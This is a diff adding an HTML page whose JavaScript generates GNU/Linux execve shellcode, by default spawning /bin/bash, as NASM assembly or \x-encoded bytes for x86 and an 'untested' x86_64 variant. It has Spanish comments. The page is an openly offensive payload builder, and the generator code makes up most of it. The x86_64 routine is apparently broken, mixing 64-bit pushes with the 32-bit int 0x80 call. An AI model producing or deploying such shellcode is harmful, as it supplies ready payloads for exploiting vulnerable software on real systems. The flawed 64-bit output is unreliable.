@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html><head><title>Shellcode generator</title>
+<script type="text/javascript">//<!--
+
+/*
+ * This program is free software. It comes without any warranty, to
+ * the extent permitted by applicable law. You can redistribute it
+ * and/or modify it under the terms of the Do What The Fuck You Want
+ * To Public License, Version 2, as published by Sam Hocevar. See
+ * http://sam.zoy.org/wtfpl/COPYING for more details.
+ */
+
+function allHex( s){
+    var x = "";
+    for( var i = 0; i < s.length; i++){
+        x += "\\x" + s.charCodeAt(i).toString(16);
+    }
+    return x;
+}
+
+
+function hexInvert( s){
+    var x = "";
+    for( var i = s.length - 1; i >= 0; i--){
+        x += s.charCodeAt(i).toString(16);
+    }
+    return x;
+}
+
+
+function generateNASM32code( cmd ){
+    var r = "BITS 32<br />" +
+            "section .text<br />" +
+            "global _start<br />" +
+            "_start: ; Inicio<br />" +
+            "    xor eax, eax ; Consigue un NULL<br />" +
+            "    push eax ; Lo introduce en la pila<br />" +
+            "    mov ecx, esp ; Guarda su direcci&oacute;n<br /><br />";
+
+    var mcmd = cmd;
+    if (mcmd.length % 2 == 1){
+        mcmd = "/" + mcmd;
+    }
+
+    while(mcmd.length > 0){
+        if(mcmd.length >= 4){
+            var start = mcmd.length - 4;
+            v = hexInvert(mcmd.substring(start));
+            mcmd = mcmd.substring(0, start);
+            r += "    push dword 0x"+ v +"<br />";
+        }
+        else{
+            v = hexInvert(mcmd);
+            r += "    push word 0x"+ v +"<br />";
+            break;
+        }
+    }
+
+    r += "<br />    mov al, 11 ; execve<br />" +
+         "    mov ebx, esp ; puntero al path del ejecutable<br />" +
+         "    int 0x80 ; syscall<br /><br />" +
+         "_end:   ; Esto solo lo finaliza<br />" +
+         "    xor eax, eax ; eax a 0<br />" +
+         "    xor ebx, ebx ; ebx a 0<br />" +
+         "    inc eax ; eax a 1 ( sys_exit )<br />" +
+         "    int 0x80 ; syscall";
+
+    return r.replace(/\s\s/g,"&nbsp;&nbsp;"); // Indenting code :)
+}
+
+
+function generateNASM64code( cmd ){
+    var r = "BITS 64<br />" +
+            "section .text<br />" +
+            "global _start<br />" +
+            "_start: ; Inicio<br />" +
+            "    xor rax, rax ; Consigue un NULL<br />" +
+            "    push rax ; Lo introduce en la pila<br />" +
+            "    mov rcx, rsp ; Guarda su direcci&oacute;n<br /><br />";
+
+    var mcmd = cmd;
+    if (mcmd.length % 2 == 1){
+        mcmd = "/" + mcmd;
+    }
+
+    while(mcmd.length > 0){
+        if(mcmd.length >= 4){
+            var start = mcmd.length - 4;
+            v = hexInvert(mcmd.substring(start));
+            mcmd = mcmd.substring(0, start);
+            r += "    push qword 0x"+ v +"<br />";
+        }
+        else{
+            v = hexInvert(mcmd);
+            r += "    push word 0x"+ v +"<br />";
+            break;
+        }
+    }
+
+    r += "<br />    mov al, 11 ; execve<br />" +
+         "    mov rbx, rsp ; puntero al path del ejecutable<br />" +
+         "    int 0x80 ; syscall<br /><br />" +
+         "_end:   ; Esto solo lo finaliza<br />" +
+         "    xor rax, rax ; reax a 0<br />" +
+         "    xor rbx, rbx ; rebx a 0<br />" +
+         "    inc rax ; rax a 1 ( sys_exit )<br />" +
+         "    int 0x80 ; syscall";
+
+    return r.replace(/\s\s/g,"&nbsp;&nbsp;"); // Indenting code :)
+}
+
+
+function generateBIN32code( cmd){
+    var r = "\\x31\\xc0" + // xor eax, eax
+            "\\x50" +     // push eax
+            "\\x89\\xe1"; // mov ecx, esp
+
+    var mcmd = cmd;
+    if (mcmd.length % 2 == 1){
+        mcmd = "/" + mcmd;
+    }
+
+    while(mcmd.length > 0){
+        if(mcmd.length >= 4){
+            var start = mcmd.length - 4;
+            v = allHex(mcmd.substring(start));
+            mcmd = mcmd.substring(0, start);
+            r += "\\x68"+ v;
+        }
+        else{
+            v = allHex(mcmd);
+            r += "\\x66\\x68" + v;
+            break;
+        }
+    }
+
+    r +=    "\\xb0\\x0b" + // mov al, 0xb
+            "\\x89\\xe3" + // mov ebx, esp
+            "\\xcd\\x80" + // int 0x80
+
+            "\\x31\\xc0" + // xor eax, eax
+            "\\x31\\xdb" + // xor ebx, ebx
+            "\\x40"      + // inc eax
+            "\\xcd\\x80";  // int 0x80
+
+    return r;
+}
+
+
+function generateBIN64code( cmd){
+    var r = "\\x48\\x31\\xc0" + // xor rax, rax
+            "\\x50" +     // push rax
+            "\\x48\\x89\\xe1"; // mov rcx, rsp
+
+    var mcmd = cmd;
+    if (mcmd.length % 2 == 1){
+        mcmd = "/" + mcmd;
+    }
+
+    while(mcmd.length > 0){
+        if(mcmd.length >= 4){
+            var start = mcmd.length - 4;
+            v = allHex(mcmd.substring(start));
+            mcmd = mcmd.substring(0, start);
+            r += "\\x68"+ v;
+        }
+        else{
+            v = allHex(mcmd);
+            r += "\\x66\\x68" + v;
+            break;
+        }
+    }
+
+    r +=    "\\xb0\\x0b" + // mov al, 0xb
+            "\\x48\\x89\\xe3" + // mov rbx, rsp
+            "\\xcd\\x80" + // int 0x80
+
+            "\\x48\\x31\\xc0" + // xor rax, rax
+            "\\x48\\x31\\xdb" + // xor rbx, rbx
+            "\\x48\\xFF\\xc0"      + // inc rax
+            "\\xcd\\x80";  // int 0x80
+
+    return r;
+}
+
+
+function generate(){
+    var pos = document.getElementById('code');
+    var cmd = document.getElementById('cmd').value;
+
+    var fmt = document.forms['js_shellcode_generator'].elements['format'];
+    var arch = document.forms['js_shellcode_generator'].elements['arch'];
+    var x = 0, y = 0;
+    var x86 = false, x86_64 = false;
+
+    for(var i = 0; i < fmt.length; i++){
+        if(fmt[i].checked){
+            x = i + 1;
+            break;
+        }
+    }
+    for(var i = 0; i < arch.length; i++){
+        if(arch[i].checked){
+            y = i + 1;
+            break;
+        }
+    }
+
+    if(y == 1){
+        x86 = true;
+    }
+    else if(y == 2){
+        x86_64 = true;
+    }
+    else{
+        pos.innerHTML = '<div id="redText">Tienes que elegir una arquitectura.</div>';
+        return;
+    }
+
+
+
+    if (x == 1){
+        if (x86){
+            pos.innerHTML = generateNASM32code( cmd);
+        }
+        else if(x86_64){
+            pos.innerHTML = generateNASM64code( cmd);
+        }
+    }
+    else if (x == 2){
+        if (x86){
+            pos.innerHTML = generateBIN32code( cmd);
+        }
+        else if (x86_64){
+            pos.innerHTML = generateBIN64code( cmd);
+        }
+    }
+    else{
+        pos.innerHTML = '<div id="redText">Tienes que elegir un formato de salida.</div>';
+        return;
+    }
+
+}
+//--></script>
+<style type="text/css"><!--
+body{
+    text-align:center;
+    background-color: #002b36;
+    color: #839496;
+}
+
+#shell{
+    background-color: #073642;
+    border-radius:5px;
+    border:1px solid #586e75;
+}
+
+#code{
+    margin: 20px;
+    text-align:left;
+}
+
+#redText{
+    color: #FF0000;
+    font-weight:bold;
+    text-align:center;
+}
+
+a:link{
+    color:#000000;
+}
+
+#footer{
+    position: fixed;
+    top: 100%;
+    font-size:14px;
+    position:relative;
+    text-align:right;
+}
+
+.notTested{
+    visibility:hidden;
+}
+--></style></head><body>
+<center><h1>Gnu/Linux shellcode generator</h1><br />
+<form name="js_shellcode_generator" onsubmit="return false;">
+Command: <input type="text" value="/bin/bash" name="cmd" id="cmd" /><br /><br />
+
+<table>
+  <tbody>
+    <tr>
+      <th>
+        Formato
+      </th>
+      <th>
+        Arquitectura
+      <th>
+    </tr>
+
+    <tr>
+      <td>
+        <label for="nasm"><input type="radio" value="nasm" name="format" id="nasm" />NASM</label>
+      </td>
+      <td>
+        <label for="x86"><input checked="checked" type="radio" value="x86" name="arch" id="x86"/>x86</label>
+      </td>
+    </tr>
+
+    <tr>
+      <td>
+        <label for="binary"><input checked="checked" type="radio" value="32BITbinary" name="format" id="32BITbinary"/>Binario \xXX encoded</label>
+      </td>
+      <td>
+        <for="x86_64" class="notTested" ><input  type="radio" value="x86_64" name="arch" id="x86_64"/>x86_64 ( untested ! )</label>
+      </td>
+    </tr>
+  </tbody>
+</table><br />
+
+<input type="submit" value="Generar" onclick="generate()"/><br /><br /></form>
+<div id="shell"><div id="code"><center></center></div></div>
+</body>
+</html>
